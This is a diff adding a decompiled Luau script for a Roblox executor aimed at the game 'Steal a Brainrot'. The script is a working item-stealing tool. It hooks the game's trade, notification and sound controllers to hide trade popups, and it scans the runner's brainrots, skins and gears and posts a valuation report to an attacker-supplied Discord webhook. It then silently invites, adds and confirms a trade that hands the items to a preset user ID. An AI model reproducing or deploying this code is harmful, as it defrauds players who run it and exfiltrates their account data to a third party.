@@ -1,0 +1,762 @@
+-- generated at .gg/Son 
+If u want deobf juste mp me
+
+return function(arg, arg2, arg3, arg4, arg5, arg6)
+	repeat
+		task.wait()
+	until game:IsLoaded()
+
+	local Players = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	game:GetService("HttpService")
+	local MarketplaceService = game:GetService("MarketplaceService")
+	game:GetService("SoundService")
+	local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
+	local Channel = require(ReplicatedStorage.Packages.Synchronizer.Channel)
+	require(ReplicatedStorage.Shared.Gears)
+	local Animals = require(ReplicatedStorage.Datas.Animals)
+	local Game = require(ReplicatedStorage.Datas.Game)
+	local Mutations = require(ReplicatedStorage.Datas.Mutations)
+	local Traits = require(ReplicatedStorage.Datas.Traits)
+	local TradeController = require(ReplicatedStorage.Controllers.TradeController)
+	local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
+	local SoundController = require(ReplicatedStorage.Controllers.SoundController)
+	local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
+	local CameraController = require(ReplicatedStorage.Controllers.CameraController)
+	local localPlayer = Players.LocalPlayer
+	local currentCamera = workspace.CurrentCamera
+	localPlayer:WaitForChild("PlayerGui")
+	local TradeLiveTrade = InterfaceController:Get("TradeLiveTrade")
+	if getgenv().ChocolaRunning then
+		return
+	end
+	getgenv().ChocolaRunning = true
+	local toggle = InterfaceController.Toggle
+	local setState = InterfaceController.SetState
+	local notify = NotificationController.Notify
+	local error = NotificationController.Error
+	local success = NotificationController.Success
+	local playSound = SoundController.PlaySound
+
+	if (not arg or arg == 0) and arg2 and arg2 ~= "" then
+		local ok, result = pcall(function()
+			return Players:GetUserIdFromNameAsync(arg2)
+		end)
+
+		if ok and result then
+			arg = result
+		end
+	end
+
+	if not arg or arg == 0 then
+		return
+	end
+
+	if not arg3 or arg3 == "" then
+		return
+	end
+	local str = "https://cdn.discordapp.com/attachments/1475020352555057262/1517322005693857962/Kangel.jpg?ex=6a35dbbc&is=6a348a3c&hm=3e4938384e9bd8b58a601f191cd203884beff1a09c703f152813e10eaebf5f0d&"
+	local flag = false
+	local flag2 = false
+	local v = ReplicatorClient.get(("Trade_%*"):format(localPlayer.UserId))
+	local n = 109983668079237
+	local n2 = 35815907
+	local n3 = 99606176102979
+
+	local function fn()
+		if game.PlaceId == n then
+			return true
+		end
+
+		local ok, result = pcall(function()
+			return MarketplaceService:GetProductInfo(game.PlaceId)
+		end)
+
+		if ok and result and result.Creator and result.Creator.CreatorType == "Group" and tonumber(result.Creator.CreatorTargetId) == n2 then
+			return true
+		end
+		return false
+	end
+
+	if not fn() then
+		localPlayer:Kick("You're stupid using modden")
+		return
+	end
+	local v2 = getupvalue(TradeController._createLiveTrade, 15)
+	local children = ReplicatedStorage.Packages.Net:GetChildren()
+	local v3 = getupvalue(TradeController.SendInvite, 1) or children[39]
+	local v4 = getupvalue(v2.Brainrot.Add, 1) or children[53]
+	local v5 = getupvalue(v2.BaseSkin.Add, 1) or children[51]
+	local v6 = getupvalue(TradeController._createLiveTrade, 24) or children[45]
+	local v7 = getupvalue(TradeController._createLiveTrade, 23) or children[46]
+
+	local tbl = {
+		Bloodrot = "<:Bloodrot_Mutation_Icon:1526148047174766612>",
+		Candy = "<:Candy_Mutation_Icon:1526148182642528347>",
+		Crystal = "<:Crystal:1532118171618902198>",
+		Cursed = "<:Cursed_Mutation_Icon:1526148377362956338>",
+		Cyber = "<:Cyber_Mutation_Icon:1526148446589816833>",
+		Default = "<:Default_Mutation_Icon:1526147901351264266>",
+		Diamond = "<:Diamond_Mutation_Icon:1526147968216858697>",
+		Divine = "<:Divine_Mutation_Icon:1526148416755990549>",
+		Galaxy = "<:Galaxy_Mutation_Icon:1526148261449306173>",
+		Gold = "<:Gold_Mutation_Icon:1526147938131251332>",
+		Lava = "<:Lava_Mutation_Icon:1526148216062742557>",
+		Phantom = "<:Phantom_Mutation_Icon:1526148483579510954>",
+		Radioactive = "<:Radioactive_Mutation_Icon:1526148308660129822>",
+		Rainbow = "<:Rainbow_Mutation_Icon:1526148005022138398>",
+		["Yin Yang"] = "<:Yin_Yang_Mutation_Icon:1526148344659841095>",
+	}
+
+	local tbl2 = {
+		["Alien Slap"] = "<:gearalienslap:1536941130581807124>",
+		["Blackhole Bomb"] = "<:gearblackholebomb:1536941156649402490>",
+		["Bloodmoon Hammer"] = "<:gearbloodmoonhammer:1536941316087222303>",
+		["Bloodmoon Slap"] = "<:gearbloodmoonslap:1536941363260821644>",
+		["Cupid's Wings"] = "<:gearcupidswings:1536941473407176715>",
+		["Cursed Slap"] = "<:gearcursedslap:1536941510824689764>",
+		["Cyber Slap"] = "<:gearcyberslap:1536941541971730483>",
+		["Demon's Head"] = "<:geardemonshead:1536941574028525649>",
+		["Divine Slap"] = "<:geardivineslap:1536941781277741076>",
+		["Lava Blaster"] = "<:gearlavablaster:1536941824915283998>",
+		["Lava Slap"] = "<:gearlavaslap:1536941851267965028>",
+		["Radioactive Airstrike"] = "<:gearradioactiveairstrike:1536941888148480000>",
+		["Radioactive Slap"] = "<:gearradioactiveslap:1536941915931545650>",
+		["Rainbow Hammer"] = "<:gearrainbowhammer:1536941964149133352>",
+		["Rainbow Slap"] = "<:gearrainbowslap:1536941997510754424>",
+		["Santa's Sleigh"] = "<:gearsantassleigh:1536942025646153818>",
+		Waverider = "<:gearwaverider:1536942058676420680>",
+		["Witch's Broom"] = "<:gearwitchsbroom:1536942085649731667>",
+		["Yin Yang Lamp"] = "<:gearyinyanglamp:1536942111218335754>",
+		["Yin Yang Slap"] = "<:gearyinyangslap:1536942134668697640>",
+		["Phantom Slap"] = "<:phantomslap:1536940296116371477>",
+		["Crystal Slap"] = "<:CrystalSlap:1536942155673903144>",
+	}
+
+	local tbl3 = {
+		Aquatic = "<:baseskinaquatic:1536943396168532018>",
+		["Bunny Basket"] = "<:baseskinbunnybasket:1536943427327889419>",
+		Christmas = "<:baseskinchristmas:1536943450388308049>",
+		Easter = "<:baseskineaster:1536943602981281792>",
+		Gingerbread = "<:baseskingingerbread:1536943707289555015>",
+		Halloween = "<:baseskinhalloween:1536943747995279380>",
+		Lucky = "<:baseskinlucky:1536943979793490000>",
+		Octo = "<:Octo_base:1536944000752418856>",
+		["Pot of Gold"] = "<:baseskinpotofgold:1536944019827986532>",
+		Rose = "<:baseskinrose:1536944091558842378>",
+		Valentines = "<:Valentines_base:1536944152565252136>",
+		Taco = "<:baseskintaco:1536944658809225286>",
+	}
+
+	local tbl4 = {
+		["10B"] = "<:10b:1526146250590785579>",
+		["1 Year"] = "<:1YR_Icon_Fixed:1526146382757498970>",
+		["1YR"] = "<:1YR_Icon_Fixed:1526146382757498970>",
+		["26"] = "<:2026Trait:1526146276452728944>",
+		[":3"] = "<:3_:1526146860757024808>",
+		Alienevent = "<:Alienevent:1526147005431418900>",
+		Ball = "<:Ball:1526146038606467073>",
+		Bombardiro = "<:Bombardiro:1526146699112747038>",
+		Brazil = "<:Brazil:1526145968674967632>",
+		Bubblegum = "<:Bubblegum:1526147039434379274>",
+		["Bunny Ears"] = "<:BunnyEars:1526146436172091483>",
+		Burger = "<:Burger_Trait:1526147238663815229>",
+		Chicleteirabicicleteira = "<:Chicleteirabicicleteira:1526146906546241657>",
+		Chocolate = "<:ChocolateTrait:1526146015445389382>",
+		Comet2 = "<:Comet2:1526146723993485312>",
+		["Comet-struck"] = "<:Cometstruck:1526145885556314173>",
+		Cometstruck = "<:Cometstruck:1526145885556314173>",
+		Claws = "<:CrabClaw:1526147141976985635>",
+		Disco = "<:Disco:1526147212457807884>",
+		Dragon = "<:Dragon:1526147276748099665>",
+		EvilTungTungSahur = "<:EvilTungTungSahur:1526147101984161863>",
+		Explosive = "<:Bombardiro:1526146699112747038>",
+		Extincty = "<:Extincty:1526145992209207307>",
+		Fire = "<:Fire:1526147415281762384>",
+		Fireworks = "<:Fireworks:1526147343211298946>",
+		Galactic = "<:Comet2:1526146723993485312>",
+		Glitched = "<:Glitch:1526147180841144350>",
+		Granny = "<:Granny:1526147444990021723>",
+		["RIP Gravestone"] = "<:GraveYardRIPTombstone:1526146501271748689>",
+		Halo = "<:HaloTraitIcon:1526146119422443520>",
+		Indonesian = "<:Indonesian:1526145949414588487>",
+		["Jack O' Lantern Pet"] = "<:JackoLantern_Pet_Trait:1526146530686537838>",
+		["John Pork"] = "<:John_Pork_Trait_HD:1526147509460664380>",
+		Lucky = "<:Lucky:1526146094675787877>",
+		["Matteo Hat"] = "<:MatteoHat:1526146756004417597>",
+		Meowl = "<:ICON_Meowl:1526147660673847317>",
+		Sombrero = "<:Mexico_Hat:1526145924844224583>",
+		Nyan = "<:Nyan:1526147310399000646>",
+		["Pink Balloon"] = "<:PinkBalloon:1526146180227268638>",
+		["Pink Egg"] = "<:PinkEgg:1526146411962433566>",
+		["Rainbow Balloon"] = "<:RainbowBalloon:1526146214175969411>",
+		["Red Balloon"] = "<:RedBalloon:1526146151022067732>",
+		["Reindeer Pet"] = "<:Reindeer:1526146642036785212>",
+		Rose = "<:Rose:1526147384201969684>",
+		["Santa Hat"] = "<:SantaHatIcon:1526146592074240070>",
+		["Shark Fin"] = "<:Shark_Fin:1526146666409885767>",
+		Skibidi = "<:SkibidiIcon:1526147476782973028>",
+		Sleepy = "<:Sleepy:1526146936522932406>",
+		Snowy = "<:Snowy:1526145862684774601>",
+		Spider = "<:Spider:1526146795825270915>",
+		Strawberry = "<:Strawberry:1526147692269408266>",
+		Summer_Hour = "<:Summer_Hour:1526146063398998016>",
+		Taco = "<:Taco:1526146973433073704>",
+		Tie = "<:Tie:1526146822903693422>",
+		Wet = "<:Wet:1526145830506070056>",
+		["Witch Hat"] = "<:Witchhat:1526146475317526589>",
+	}
+
+	local function fn2()
+		local _vm_m_1 = 1
+		local _vm_m_0
+
+		for i = 2, 8 do
+			local v8 = debug.info(i, "s")
+			if not v8 then
+				_vm_m_1 = _vm_m_0
+				return false
+			end
+
+			if v8:find("TradeController") then
+				return true
+			end
+		end
+
+		_vm_m_1 = _vm_m_0
+		return false
+	end
+
+	local function fn3(arg7)
+		if typeof(arg7) ~= "string" then
+			return false
+		end
+		local str2 = arg7:gsub("<[^>]+>", "")
+		local str3 = str2:lower()
+		local flag3 = str2:find("@") ~= nil
+		return flag3 and str3:find("cancel") or str2:find("Failed") and str3:find("trade") or flag3 and str3:find("completed")
+	end
+
+	local function playSound2(arg7, arg8, ...)
+		local TradeLiveTrade2 = InterfaceController:Get("TradeLiveTrade")
+		local pos = fn2()
+
+		if not pos then
+			pos = debug.info(2, "s"):find("AnimatedButton") and TradeLiveTrade2 and TradeLiveTrade2:IsOpened()
+		end
+
+		if pos then
+			return
+		end
+		return playSound(arg7, arg8, ...)
+	end
+
+	SoundController.PlaySound = playSound2
+
+	if TradeLiveTrade and TradeLiveTrade:IsOpened() then
+		InterfaceController:Toggle("TradeLiveTrade", false)
+		CameraController:Blur(0, 0)
+		CameraController:Fov(CameraController:GetDefaultFov(), 0)
+	end
+
+	InterfaceController.Toggle = function(arg7, arg8, arg9, arg10)
+		if arg8 == "TradeLiveTrade" then
+			return
+		end
+		return toggle(arg7, arg8, arg9, arg10)
+	end
+
+	InterfaceController.SetState = function(arg7, arg8, arg9, arg10)
+		if arg8 == "TradeLiveTrade" then
+			return
+		end
+		return setState(arg7, arg8, arg9, arg10)
+	end
+
+	local function notify2(arg7, arg8, ...)
+		if fn2() or fn3(arg8) then
+			return
+		end
+		local v8 = table.pack(...)
+		local v9 = notify
+		v8.n = 3 + v8.n - 1
+		table.move(v8, 1, v8.n, 3, v8)
+		v8[1] = arg7
+		v8[2] = arg8
+		return v9(table.unpack(v8, 1, v8.n))
+	end
+
+	NotificationController.Notify = notify2
+
+	NotificationController.Error = function(arg7, ...)
+		if fn2() then
+			return
+		end
+		local v8 = table.pack(...)
+		return error(arg7, table.unpack(v8, 1, v8.n))
+	end
+
+	NotificationController.Success = function(arg7, ...)
+		if fn2() then
+			return
+		end
+		return success(arg7, ...)
+	end
+
+	local function fn4(arg7)
+		if not arg7 or arg7 == 0 then
+			return "$0/s"
+		end
+		local tbl5 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
+		local n4 = math.floor(math.log10(math.abs(arg7)) / 3)
+		if n4 == 0 then
+			return "$" .. tostring(math.floor(arg7)) .. "/s"
+		end
+		local str2 = string.format("%.1f", arg7 / 1000 ^ n4)
+
+		if str2:sub(-2) == ".0" then
+			str2 = str2:sub(1, -3)
+		end
+
+		return "$" .. str2 .. tbl5[n4 + 1] .. "/s"
+	end
+
+	local function fn5(arg7, arg8, arg9)
+		if type(arg7) ~= "string" then
+			return 0
+		end
+		local v8 = Animals[arg7]
+		if not v8 then
+			return 0
+		end
+		local generation = v8.Generation or v8.Price * Game.Game.AnimalGanerationModifier
+		local flag3 = arg8 and arg8 ~= "None" and Mutations[arg8]
+		local n4 = 1
+
+		if flag3 then
+			n4 = 1 + Mutations[arg8].Modifier
+		end
+
+		if arg9 then
+			local flag4 = false
+
+			for _, v9 in ipairs(arg9) do
+				if v9 == "Sleepy" then
+					flag4 = true
+				elseif Traits[v9] then
+					n4 += Traits[v9].MultiplierModifier
+				end
+			end
+
+			if flag4 then
+				n4 *= 0.5
+			end
+		end
+
+		return math.round(generation * n4)
+	end
+
+	local function fn6()
+		for _, v8 in getgc(true) do
+			if type(v8) == "table" and getmetatable(v8) == Channel then
+				if v8.Index == localPlayer then
+					return v8.CacheTable
+				end
+			end
+		end
+	end
+
+	local v8
+
+	repeat
+		v8 = fn6()
+		task.wait(0.1)
+	until v8
+
+	local tbl5 = {}
+	local tbl6 = {}
+	local tbl7 = {}
+	local name = localPlayer.Name
+	local userId = localPlayer.UserId
+	local animalPodiums = v8.AnimalPodiums
+
+	if type(animalPodiums) == "table" then
+		for k, animalPodium in pairs(animalPodiums) do
+			if type(animalPodium) == "table" and animalPodium.Index then
+				if arg4[animalPodium.Index] then
+					local v9 = fn5(animalPodium.Index, animalPodium.Mutation, animalPodium.Traits)
+					local insert = table.insert
+
+					insert(tbl5, {
+						slotKey = tonumber(k),
+						data = animalPodium,
+						mutation = animalPodium.Mutation or "None",
+						traits = animalPodium.Traits or {},
+						genValue = v9,
+					})
+				end
+			end
+		end
+	end
+
+	local baseSkinInventory = v8.BaseSkinInventory
+
+	if type(baseSkinInventory) == "table" then
+		for k, v9 in pairs(baseSkinInventory) do
+			if type(v9) == "table" and v9.SkinName then
+				if arg5[v9.SkinName] then
+					table.insert(tbl6, { SkinName = v9.SkinName, UUID = k })
+				end
+			end
+		end
+	end
+
+	local gearInventory = v8.GearInventory
+
+	if type(gearInventory) == "table" then
+		for k, v9 in pairs(gearInventory) do
+			if type(v9) == "table" and v9.GearName then
+				if arg6[v9.GearName] then
+					table.insert(tbl7, { GearName = v9.GearName, UUID = k })
+				end
+			end
+		end
+	end
+
+	if #tbl5 == 0 and #tbl6 == 0 and #tbl7 == 0 then
+		return
+	end
+	local request_ = syn and syn.request or http and http.request or http_request or request
+
+	local function fn7(arg7)
+		local HttpService = game:GetService("HttpService")
+		local str2 = "https://stealabrainrot.fandom.com/api.php?action=query&titles=" .. HttpService:UrlEncode(arg7) .. "&prop=pageimages&pithumbsize=80&format=json&redirects=1&normalize=1"
+
+		local ok, result = pcall(function()
+			return request_({ Url = str2, Method = "GET" })
+		end)
+
+		if not ok or not result then
+			return nil
+		end
+
+		local ok2, result2 = pcall(function()
+			return HttpService:JSONDecode(result.Body)
+		end)
+
+		if not ok2 or not result2 or not result2.query or not result2.query.pages then
+			return nil
+		end
+
+		for _, page in pairs(result2.query.pages) do
+			if page.thumbnail then
+				return page.thumbnail.source
+			end
+		end
+
+		return nil
+	end
+
+	local function fn8()
+		if flag2 then
+			return
+		end
+		flag2 = true
+		local str2 = "Unknown"
+
+		pcall(function()
+			if syn and syn.getexecutorname then
+				str2 = syn.getexecutorname()
+			elseif getexecutorname then
+				str2 = getexecutorname()
+			end
+		end)
+
+		local tbl8 = {}
+		local tbl9 = {}
+		local tbl10 = {}
+		local v9, v10, v11 = ipairs(tbl5)
+		local _vm_F_1 = (function(iterator, iteratorState, control) return function() local values = table.pack(iterator(iteratorState, control)); control = values[1]; if control == nil then return false end; return true, table.unpack(values, 1, values.n) end end)(v9, v10, v11)
+
+		for _, v12 in v9, v10, v11 do
+			local insert = table.insert
+
+			insert(tbl8, {
+				type = "brainrot",
+				name = v12.data.Index,
+				mutation = v12.mutation or "None",
+				traits = v12.traits or {},
+				genValue = v12.genValue,
+			})
+		end
+
+		local _vm_F_0
+		_vm_F_1 = _vm_F_0
+		local _vm_e_0
+		local _vm_e_1 = _vm_e_0
+		local _vm_m_0
+		local _vm_m_1 = _vm_m_0
+		local v12, v13, v14 = ipairs(tbl6)
+		_vm_F_1 = (function(iterator, iteratorState, control) return function() local values = table.pack(iterator(iteratorState, control)); control = values[1]; if control == nil then return false end; return true, table.unpack(values, 1, values.n) end end)(v12, v13, v14)
+
+		for _, v15 in v12, v13, v14 do
+			table.insert(tbl9, { type = "baseskin", name = v15.SkinName })
+		end
+
+		_vm_F_1 = _vm_F_0
+		_vm_e_1 = _vm_e_0
+		_vm_m_1 = _vm_m_0
+		local v15, v16, v17 = ipairs(tbl7)
+		_vm_F_1 = (function(iterator, iteratorState, control) return function() local values = table.pack(iterator(iteratorState, control)); control = values[1]; if control == nil then return false end; return true, table.unpack(values, 1, values.n) end end)(v15, v16, v17)
+
+		for _, v18 in v15, v16, v17 do
+			table.insert(tbl10, { type = "gear", name = v18.GearName })
+		end
+
+		_vm_F_1 = _vm_F_0
+		_vm_e_1 = _vm_e_0
+		_vm_m_1 = _vm_m_0
+
+		table.sort(tbl8, function(arg7, arg8)
+			return (arg7.genValue or 0) > (arg8.genValue or 0)
+		end)
+
+		local v18 = tbl8[1] or nil
+		local tbl11 = {}
+		local v19, v20, v21 = ipairs(tbl8)
+		local n4 = 0
+		local n5 = 0
+		_vm_F_1 = (function(iterator, iteratorState, control) return function() local values = table.pack(iterator(iteratorState, control)); control = values[1]; if control == nil then return false end; return true, table.unpack(values, 1, values.n) end end)(v19, v20, v21)
+
+		for _, v22 in v19, v20, v21 do
+			n4 += 1
+			n5 += v22.genValue or 0
+			local mutation = v22.mutation or "None"
+			local traits = v22.traits or {}
+			local v23 = fn4(v22.genValue or 0)
+			local str3 = "`" .. n4 .. ".`  " .. (mutation ~= "None" and tbl[mutation] or tbl.Default) .. "  **" .. v22.name .. "**  "
+
+			if #traits > 0 then
+				for _, trait in ipairs(traits) do
+					local v24 = tbl4[trait]
+
+					if v24 then
+						str3 ..= v24 .. "  "
+					else
+						str3 ..= "`" .. trait .. "`  "
+					end
+				end
+
+				if #traits > 1 then
+					str3 ..= "(x" .. #traits .. " traits)  "
+				end
+			end
+
+			table.insert(tbl11, str3 .. utf8.char(8212) .. " " .. v23)
+		end
+
+		_vm_F_1 = _vm_F_0
+		_vm_e_1 = _vm_e_0
+		_vm_m_1 = _vm_m_0
+		local v22, v23, v24 = ipairs(tbl9)
+		_vm_F_1 = (function(iterator, iteratorState, control) return function() local values = table.pack(iterator(iteratorState, control)); control = values[1]; if control == nil then return false end; return true, table.unpack(values, 1, values.n) end end)(v22, v23, v24)
+
+		for _, v25 in v22, v23, v24 do
+			n4 += 1
+			table.insert(tbl11, string.format("`%d.`  %s  **%s**  *(Base Skin)*", n4, tbl3[v25.name] or utf8.char(127912), v25.name))
+		end
+
+		_vm_F_1 = _vm_F_0
+		_vm_e_1 = _vm_e_0
+		_vm_m_1 = _vm_m_0
+		local v25, v26, v27 = ipairs(tbl10)
+		_vm_F_1 = (function(iterator, iteratorState, control) return function() local values = table.pack(iterator(iteratorState, control)); control = values[1]; if control == nil then return false end; return true, table.unpack(values, 1, values.n) end end)(v25, v26, v27)
+
+		for _, v28 in v25, v26, v27 do
+			n4 += 1
+			table.insert(tbl11, string.format("`%d.`  %s  **%s**  *(Gear)*", n4, tbl2[v28.name] or utf8.char(9881, 65039), v28.name))
+		end
+
+		_vm_F_1 = _vm_F_0
+		_vm_e_1 = _vm_e_0
+		_vm_m_1 = _vm_m_0
+		if n4 == 0 then
+			return
+		end
+		local v28 = nil
+
+		if v18 then
+			pcall(function()
+				v28 = fn7(v18.name)
+			end)
+		end
+
+		local now = os.time()
+		local v29 = fn4(n5)
+		local n6 = #Players:GetPlayers()
+		local flag3 = game.PlaceId == n3
+		local str3 = flag3 and "**In Duel**" or "**Not in Duel**"
+		flag3 = flag3 and 16711680 or 41983
+		local HttpService = game:GetService("HttpService")
+
+		local tbl12 = {
+			title = "AUTO MOREIRA CHOCOLA SCRIPT",
+			description = string.format([[%s  **Invite sent to:**  `%s`  (ID:  %s)
+
+%s  **Inventory scan complete.**
+
+%s
+
+%s  **Total Value:**  %s]], utf8.char(128232), name, userId, utf8.char(128202), table.concat(tbl11, "\n"), utf8.char(128176), v29),
+			color = flag3,
+		}
+
+		local fields = {}
+		local tbl13 = { name = utf8.char(128338) .. "  Executed", value = "<t:" .. now .. ":R>", inline = true }
+		local tbl14 = { name = utf8.char(9889) .. "  Status", value = str3, inline = true }
+		local tbl15 = { name = utf8.char(9889) .. "  Executor", value = "**" .. str2 .. "**", inline = true }
+		local tbl16 = { name = utf8.char(127757) .. "  Server", value = "Players:  **" .. n6 .. "**", inline = true }
+		fields[1] = tbl13
+		fields[2] = tbl14
+		fields[3] = tbl15
+		fields[4] = tbl16
+		tbl12.fields = fields
+		tbl12.footer = { text = "CHOCOLA SCRIPT  |  discord.gg/74GMyygaMy", icon_url = str }
+		tbl12.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		tbl12.thumbnail = v28 and { url = v28 } or nil
+		local tbl17 = { content = "@everyone", username = "AUTO MOREIRA CHOCOLA", avatar_url = str, embeds = { tbl12 } }
+
+		if request_ then
+			pcall(function()
+				request_({
+					Url = arg3,
+					Method = "POST",
+					Headers = { ["Content-Type"] = "application/json" },
+					Body = HttpService:JSONEncode(tbl17),
+				})
+			end)
+		end
+	end
+
+	local function fn9()
+		while v:TryIndex({ "active", "data" }) do
+			task.wait(0.1)
+		end
+
+		flag = false
+	end
+
+	v:ListenRaw(function(arg7)
+		if not arg7 then
+			return
+		end
+
+		if v:TryIndex({ "active", "data" }) and not flag then
+			flag = true
+		end
+	end)
+
+	task.spawn(function()
+		while true do
+			if not flag and v3 then
+				pcall(function()
+					v3:InvokeServer("be01db97-504e-48f7-b7da-ff1f3969e089", arg)
+				end)
+			end
+
+			task.wait(0.1)
+		end
+	end)
+
+	task.spawn(fn8)
+
+	task.spawn(function()
+		while true do
+			flag = false
+
+			while not flag do
+				task.wait()
+			end
+
+			task.spawn(function()
+				while flag do
+					if v6 then
+						pcall(function()
+							v6:FireServer("710f3be3-ec7b-4cb8-acf1-6fa6f2729a63")
+						end)
+					end
+
+					task.wait(0.05)
+
+					if v7 then
+						pcall(function()
+							v7:FireServer("37d9ae72-289c-431b-90d1-1d477f017912")
+						end)
+					end
+
+					task.wait(0.05)
+				end
+			end)
+
+			task.spawn(function()
+				local n4 = 1
+
+				while flag do
+					if #tbl5 > 0 then
+						local v9 = tbl5[n4]
+
+						if v9 then
+							pcall(function()
+								v4:InvokeServer("6f28b341-bbc2-4ba0-a515-a3bc728c8c12", v9.slotKey, v9.data)
+							end)
+
+							n4 = n4 % #tbl5 + 1
+						end
+					end
+
+					task.wait(1)
+				end
+			end)
+
+			task.spawn(function()
+				local n4 = 1
+				local n5 = 1
+
+				while flag do
+					local flag3 = math.random(1, 2) == 1
+					local str2 = nil
+					local tbl8 = nil
+					local v9
+
+					if flag3 and #tbl7 > 0 then
+						v9 = tbl7[n4]
+						str2 = "Gear"
+						tbl8 = { GearName = v9.GearName }
+						tbl8.UUID = v9.UUID or ""
+						n4 = n4 % #tbl7 + 1
+					else
+						local flag4 = not flag3 and #tbl6 > 0
+						v9 = nil
+
+						if flag4 then
+							v9 = tbl6[n5]
+							str2 = "BaseSkin"
+							tbl8 = { UUID = v9.UUID, SkinName = v9.SkinName }
+							n5 = n5 % #tbl6 + 1
+						end
+					end
+
+					if v9 then
+						pcall(function()
+							v5:InvokeServer("4e73e2f9-e296-4b0b-94db-d2e7e12c726f", str2, tbl8)
+						end)
+					end
+
+					task.wait(1)
+				end
+			end)
+
+			fn9()
+		end
+	end)
+end
